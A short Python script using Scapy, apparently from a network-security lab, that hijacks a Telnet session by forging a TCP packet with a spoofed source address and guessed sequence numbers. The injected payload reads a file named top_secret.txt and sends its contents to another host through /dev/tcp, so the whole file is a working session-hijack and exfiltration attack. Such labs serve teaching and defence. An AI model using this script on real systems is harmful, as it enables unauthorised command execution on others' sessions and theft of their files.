import sys
from scapy.all import *

ip = IP(src="10.0.2.16",dst="10.0.2.12")
tcp = TCP(sport=41518,dport=23,flags="A",seq=2683492429,ack=1279233260)
Data = "\r cat ~/top_secret.txt > /dev/tcp/10.0.2.13/9090\r"
pkt = ip/tcp/Data
ls(pkt)
send(pkt,verbose=0)
